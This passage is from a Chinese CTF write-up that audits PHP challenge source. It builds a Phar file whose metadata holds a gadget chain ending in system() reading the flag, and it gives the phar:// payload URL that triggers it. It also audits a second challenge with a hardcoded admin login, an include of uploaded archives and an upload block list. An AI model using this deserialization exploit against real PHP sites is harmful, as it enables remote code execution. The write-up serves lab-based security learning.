+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__construct</span>() {
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__wakeup</span>()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">test</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__invoke</span>() {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">a</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">rce_me</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">C</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $b;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__construct</span>($b <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">b</span> <span style="color:#f92672">=</span> $b;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">rce_me</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Success!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cat /flag/flag.txt &gt; /tmp/flag&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><ul>
+<li>定义了三个类，熟悉的 PHP 反序列化的味道</li>
+</ul>
+<p><strong>做到这里思路已经非常清楚了，就是要执行 PHP 反序列化，要用上传的 Phar 文件解析执行反序列化，通过 dirsearch 目录扫描得到上传文件入口 uploads.php，查看 uploads.php 文件</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#75715e">// uploads.php
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$uploadDir <span style="color:#f92672">=</span> <span style="color:#66d9ef">__DIR__</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/uploads/&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">is_dir</span>($uploadDir)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mkdir</span>($uploadDir, <span style="color:#ae81ff">0755</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>$whitelist <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;txt&#39;</span>, <span style="color:#e6db74">&#39;log&#39;</span>, <span style="color:#e6db74">&#39;jpg&#39;</span>, <span style="color:#e6db74">&#39;jpeg&#39;</span>, <span style="color:#e6db74">&#39;png&#39;</span>, <span style="color:#e6db74">&#39;zip&#39;</span>,<span style="color:#e6db74">&#39;gif&#39;</span>,<span style="color:#e6db74">&#39;gz&#39;</span>];
+</span></span><span style="display:flex;"><span>$allowedMimes <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;txt&#39;</span>  <span style="color:#f92672">=&gt;</span> [<span style="color:#e6db74">&#39;text/plain&#39;</span>],
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;log&#39;</span>  <span style="color:#f92672">=&gt;</span> [<span style="color:#e6db74">&#39;text/plain&#39;</span>],
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;jpg&#39;</span>  <span style="color:#f92672">=&gt;</span> [<span style="color:#e6db74">&#39;image/jpeg&#39;</span>],
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;jpeg&#39;</span> <span style="color:#f92672">=&gt;</span> [<span style="color:#e6db74">&#39;image/jpeg&#39;</span>],
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;png&#39;</span>  <span style="color:#f92672">=&gt;</span> [<span style="color:#e6db74">&#39;image/png&#39;</span>],
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;zip&#39;</span>  <span style="color:#f92672">=&gt;</span> [<span style="color:#e6db74">&#39;application/zip&#39;</span>, <span style="color:#e6db74">&#39;application/x-zip-compressed&#39;</span>, <span style="color:#e6db74">&#39;multipart/x-zip&#39;</span>],
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;gif&#39;</span>  <span style="color:#f92672">=&gt;</span> [<span style="color:#e6db74">&#39;image/gif&#39;</span>],
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;gz&#39;</span>   <span style="color:#f92672">=&gt;</span> [<span style="color:#e6db74">&#39;application/gzip&#39;</span>, <span style="color:#e6db74">&#39;application/x-gzip&#39;</span>]
+</span></span><span style="display:flex;"><span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$resultMessage <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($_SERVER[<span style="color:#e6db74">&#39;REQUEST_METHOD&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;POST&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_FILES[<span style="color:#e6db74">&#39;file&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    $file <span style="color:#f92672">=</span> $_FILES[<span style="color:#e6db74">&#39;file&#39;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($file[<span style="color:#e6db74">&#39;error&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#a6e22e">UPLOAD_ERR_OK</span>) {
+</span></span><span style="display:flex;"><span>        $originalName <span style="color:#f92672">=</span> $file[<span style="color:#e6db74">&#39;name&#39;</span>];
+</span></span><span style="display:flex;"><span>        $ext <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtolower</span>(<span style="color:#a6e22e">pathinfo</span>($originalName, <span style="color:#a6e22e">PATHINFO_EXTENSION</span>));
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">in_array</span>($ext, $whitelist, <span style="color:#66d9ef">true</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;File extension not allowed.&#39;</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        $mime <span style="color:#f92672">=</span> $file[<span style="color:#e6db74">&#39;type&#39;</span>];
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($allowedMimes[$ext]) <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">in_array</span>($mime, $allowedMimes[$ext], <span style="color:#66d9ef">true</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;MIME type mismatch or not allowed. Detected: &#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">htmlspecialchars</span>($mime));
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        $safeBaseName <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;/[^A-Za-z0-9_\-\.]/&#39;</span>, <span style="color:#e6db74">&#39;_&#39;</span>, <span style="color:#a6e22e">basename</span>($originalName));
+</span></span><span style="display:flex;"><span>        $safeBaseName <span style="color:#f92672">=</span> <span style="color:#a6e22e">ltrim</span>($safeBaseName, <span style="color:#e6db74">&#39;.&#39;</span>);
+</span></span><span style="display:flex;"><span>        $targetFilename <span style="color:#f92672">=</span> <span style="color:#a6e22e">time</span>() <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;_&#39;</span> <span style="color:#f92672">.</span> $safeBaseName;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">file_put_contents</span>(<span style="color:#e6db74">&#39;/tmp/log.txt&#39;</span>, <span style="color:#e6db74">&#34;upload file success: </span><span style="color:#e6db74">$targetFilename</span><span style="color:#e6db74">, MIME: </span><span style="color:#e6db74">$mime\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        $targetPath <span style="color:#f92672">=</span> $uploadDir <span style="color:#f92672">.</span> $targetFilename;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">move_uploaded_file</span>($file[<span style="color:#e6db74">&#39;tmp_name&#39;</span>], $targetPath)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">@</span><span style="color:#a6e22e">chmod</span>($targetPath, <span style="color:#ae81ff">0644</span>);
+</span></span><span style="display:flex;"><span>            $resultMessage <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;div class=&#34;success&#34;&gt; File uploaded successfully &#39;</span><span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;&lt;/div&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            $resultMessage <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;div class=&#34;error&#34;&gt; Failed to move uploaded file.&lt;/div&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        $resultMessage <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;div class=&#34;error&#34;&gt; Upload error: &#39;</span> <span style="color:#f92672">.</span> $file[<span style="color:#e6db74">&#39;error&#39;</span>] <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;&lt;/div&gt;&#39;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><ul>
+<li>对上传对文件进行白名单检查机制</li>
+<li>文件上传路径为 uploads/</li>
+<li>会对上传的文件名进行重命名，重命名信息记录在 /tmp/log.txt 文件中</li>
+</ul>
+<p><strong>构造 Phar 文件</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#75715e">// 构造代码
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">A</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $file;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $luo;  <span style="color:#75715e">// 2 B
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__construct</span>() {
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__toString</span>() {  <span style="color:#75715e">// 2 将对象当做字符串使用时调用
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $function <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">luo</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $function();  <span style="color:#75715e">// 1 __invoke()触发
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">B</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $a;  <span style="color:#75715e">// 1 C
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">public</span> $test;  <span style="color:#75715e">// 3 A
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__construct</span>() {
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__wakeup</span>()  <span style="color:#75715e">// 3 反序列化时触发
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">test</span>);  <span style="color:#75715e">// 2 __toString()触发
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__invoke</span>() {  <span style="color:#75715e">// 1 将对象当做函数使用时调用
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">a</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">rce_me</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">C</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $b;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__construct</span>($b <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">b</span> <span style="color:#f92672">=</span> $b;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">rce_me</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Success!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cat /flag/flag.txt &gt; /tmp/flag&#34;</span>);  <span style="color:#75715e">// 最后目标
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$a <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">C</span>();
+</span></span><span style="display:flex;"><span>$b <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">B</span>();
+</span></span><span style="display:flex;"><span>$b<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> $a;
+</span></span><span style="display:flex;"><span>$c <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">A</span>();
+</span></span><span style="display:flex;"><span>$c<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">luo</span> <span style="color:#f92672">=</span> $b;
+</span></span><span style="display:flex;"><span>$d <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">B</span>();
+</span></span><span style="display:flex;"><span>$d<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">test</span> <span style="color:#f92672">=</span> $c;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$phar <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Phar</span>(<span style="color:#e6db74">&#34;exp.phar&#34;</span>);
+</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">startBuffering</span>();
+</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setStub</span>(<span style="color:#e6db74">&#34;&lt;?php __HALT_COMPILER();?&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">setMetadata</span>($d);
+</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">addFromString</span>(<span style="color:#e6db74">&#34;test.txt&#34;</span>,<span style="color:#e6db74">&#34;test&#34;</span>);
+</span></span><span style="display:flex;"><span>$phar<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">stopBuffering</span>();
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p><strong>将文件后缀改为 png 上传，在查看 /tmp/log.txt 文件得到实际文件名<code>upload file success: 1763431210_exp.png, MIME: image/png</code>，然后最终 Payload 如下</strong></p>
+<pre tabindex="0"><code class="language-Payload" data-lang="Payload">index.php?filename=phar://uploads/1763431210_exp.png&amp;serialized=1
+</code></pre><h1 id="eeeeezzzzzzzip">eeeeezzzzzzZip<a hidden class="anchor" aria-hidden="true" href="#eeeeezzzzzzzip">#</a></h1>
+<p>#代码审计 #目录扫描 #文件上传 #文件包含</p>
+<p>题目描述：小杭写了一个压缩包管理平台，但是作为一个开发很不仔细，也许有什么问题在里面呢</p>
+<p>网站首页是一个压缩包管理平台登录页面，首先尝试登录弱口令和 SQLi 均无果，用 dirsearch 目录扫描，得到 /upload.php 文件上传页面，以及 www.zip 网站源码压缩包，解压后<strong>进行源码审计</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#75715e">// login.php
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
+</span></span><span style="display:flex;"><span>$err <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($_SERVER[<span style="color:#e6db74">&#39;REQUEST_METHOD&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;POST&#39;</span>) {
+</span></span><span style="display:flex;"><span>    $u <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;user&#39;</span>] <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>    $p <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;pass&#39;</span>] <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($u <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;admin&#39;</span> <span style="color:#f92672">&amp;&amp;</span> $p <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;guest123&#39;</span>) {
+</span></span><span style="display:flex;"><span>        $_SESSION[<span style="color:#e6db74">&#39;user&#39;</span>] <span style="color:#f92672">=</span> $u;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: index.php&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">exit</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        $err <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;登录失败：用户名或密码错误&#39;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><ul>
+<li>暴露了管理员用户名和密码</li>
+</ul>
+<p><strong>登录压缩包管理平台后台，发现文件上传页面也就是 /upload.php</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#75715e">// index.php
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#39;user&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: login.php&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">exit</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>$salt <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;GeekChallenge_2025&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#39;dir&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    $_SESSION[<span style="color:#e6db74">&#39;dir&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">bin2hex</span>(<span style="color:#a6e22e">random_bytes</span>(<span style="color:#ae81ff">4</span>));
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>$SANDBOX <span style="color:#f92672">=</span> <span style="color:#a6e22e">sys_get_temp_dir</span>() <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;/uploads_&#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">md5</span>($salt <span style="color:#f92672">.</span> $_SESSION[<span style="color:#e6db74">&#39;dir&#39;</span>]);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">is_dir</span>($SANDBOX)) <span style="color:#a6e22e">mkdir</span>($SANDBOX, <span style="color:#ae81ff">0700</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$files <span style="color:#f92672">=</span> <span style="color:#a6e22e">array_diff</span>(<span style="color:#a6e22e">scandir</span>($SANDBOX), [<span style="color:#e6db74">&#39;.&#39;</span>, <span style="color:#e6db74">&#39;..&#39;</span>]);
+</span></span><span style="display:flex;"><span>$result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;f&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    $filename <span style="color:#f92672">=</span> <span style="color:#a6e22e">basename</span>($_GET[<span style="color:#e6db74">&#39;f&#39;</span>]);
+</span></span><span style="display:flex;"><span>    $fullpath <span style="color:#f92672">=</span> $SANDBOX <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">.</span> $filename;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">file_exists</span>($fullpath) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/\.(zip|bz2|gz|xz|7z)$/i&#39;</span>, $filename)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">ob_start</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">@</span><span style="color:#66d9ef">include</span>($fullpath);
+</span></span><span style="display:flex;"><span>        $result <span style="color:#f92672">=</span> <span style="color:#a6e22e">ob_get_clean</span>();
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        $result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;文件不存在或非法类型。&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><ul>
+<li>
+<p>通过 GET 方法传入<code>f</code>参数（上传文件名），最终执行文件包含</p>
+</li>
+<li>
+<p>进行文件名后缀白名单匹配</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PHP" data-lang="PHP"><span style="display:flex;"><span><span style="color:#75715e">// upload.php
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>$allowed_extensions <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;zip&#39;</span>, <span style="color:#e6db74">&#39;bz2&#39;</span>, <span style="color:#e6db74">&#39;gz&#39;</span>, <span style="color:#e6db74">&#39;xz&#39;</span>, <span style="color:#e6db74">&#39;7z&#39;</span>];
+</span></span><span style="display:flex;"><span>$allowed_mime_types <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;application/zip&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;application/x-bzip2&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;application/gzip&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;application/x-gzip&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;application/x-xz&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;application/x-7z-compressed&#39;</span>,
+</span></span><span style="display:flex;"><span>];
+</span></span><span style="display:flex;"><span>$BLOCK_LIST <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;__HALT_COMPILER()&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;PK&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&lt;?&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&lt;?php&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;phar://&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;php&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;?&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">content_filter</span>($tmpfile, $block_list) {
+</span></span><span style="display:flex;"><span>    $fh <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>($tmpfile, <span style="color:#e6db74">&#34;rb&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$fh) <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>    $head <span style="color:#f92672">=</span> <span style="color:#a6e22e">fread</span>($fh, <span style="color:#ae81ff">4096</span>);
